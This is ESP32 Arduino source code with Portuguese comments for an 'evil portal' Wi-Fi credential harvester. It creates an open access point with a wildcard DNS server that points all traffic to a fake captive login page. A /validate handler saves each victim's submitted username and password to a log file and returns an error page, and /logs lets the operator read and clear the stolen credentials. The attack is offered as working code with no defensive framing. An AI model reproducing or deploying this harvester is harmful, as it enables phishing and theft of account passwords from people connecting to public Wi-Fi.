#define LOGFILE "/log.txt"

void Evilsetup() {
  // Iniciar comunicação serial
  Serial.println();
  Serial.println("ESP32captive(1.5)");
  Serial.println();

  // configuração de LED
 pinMode(LED_ESP, OUTPUT);
 digitalWrite(LED_ESP, HIGH);  

  // Inicialize o sistema de arquivos (SPIFFS) e leia o arquivo de log, se não estiver presente, crie um novo
  Serial.print("Inicializando o sistema de arquivos (a primeira vez pode levar cerca de 90 segundos)...");
  //if (!SPIFFS.begin(true)){    
    //Serial.print("SPIFFS nao formatado. Formatando...");
    SPIFFS.begin();
//  }
  
  Serial.println("Sucesso!");
  Serial.print("Verificando o arquivo log.txt...");
  
  // isso abre o arquivo "log.txt" em modo de leitura
  //File f = SPIFFS.open(LOGFILE, FILE_READ);
  
  if (!SPIFFS.exists(LOGFILE)) {
    Serial.print("O arquivo ainda não existe.\n Formatando e criando...");
    File f = SPIFFS.open(LOGFILE, FILE_WRITE);
    if (!f) {
      Serial.println("Falha na criação do arquivo!");
    }
    f.println("Credenciais de login capturadas:");
    f.close();
  }
  //f.close();
  Serial.println(" Sucesso!");

  // Criar Ponto de Acesso
  Serial.print("Criando Ponto de Acesso...");
  WiFi.mode(WIFI_AP);
  delay(2000);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP("teste");
  delay(500);
  Serial.println(" Sucesso!");

  // Inicie o servidor DNS
  Serial.print("Iniciando Servidor DNS...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Sucesso!");

  // Verifique o nome do domínio e atualize a página
  server.on("/", handleRoot);
  server.on("/generate_204", handleRoot);  // Portal cativo Android. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
  server.on("/fwlink", handleRoot); // Portal cativo da Microsoft. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
  server.onNotFound(handleRoot);

  // Valide e salve as combinações USUARIO / SENHA
  server.on("/validate", []() {
    // armazenar credenciais colhidas
    String url = server.arg("url");
    String user = server.arg("user");
    String pass = server.arg("pass");

    // Enviando dados para Serial (DEBUG
    serialString = user+":"+pass;
    Serial.println(serialString);

    // Anexar dados ao arquivo de log
    File f = SPIFFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();
    
    // Envie uma resposta de erro ao usuário após a coleta de credencial
    server.send(500, "text/html", erroPage);

    // Reinicializar strings de buffer
    serialString="";
    webString="";

    blink(10);
    
  });

//+=================



 server.on("/wifinome", [](){
 webString=" <html><head><title>Page Title</title></head><body><input id='eml' type='text' name='user' class='1' placeholder='Email ou Telefone' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required></label></body></html>";
  server.send(200, "text/html", webString);
 String nomerede = server.arg("user");
 const char *ssid= nomerede.c_str();
WiFi.setHostname(ssid);
 });



//==============+++++++++++++


  // Logging Page
  server.on("/logs", [](){
    webString="<html><body><h1>Captured Logs</h1><br><pre>";
    File f = SPIFFS.open(LOGFILE, "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
    server.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });

  // Limpar todos os logs
  server.on("/logs/clear", [](){
    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
    File f = SPIFFS.open(LOGFILE, "w");
    f.println("Credenciais de login capturadas:");
    f.close();
    server.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });
  
  // Inicie o servidor da Web
  Serial.print("Iniciando o Servidor da Web...");
  server.begin();
  Serial.println(" Sucesso!");
  
  blink(1);
  
  Serial.println("Dispositivo pronto!");
}

void Evilloop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");

  server.send(200, "text/html", captivePortalPage);
}
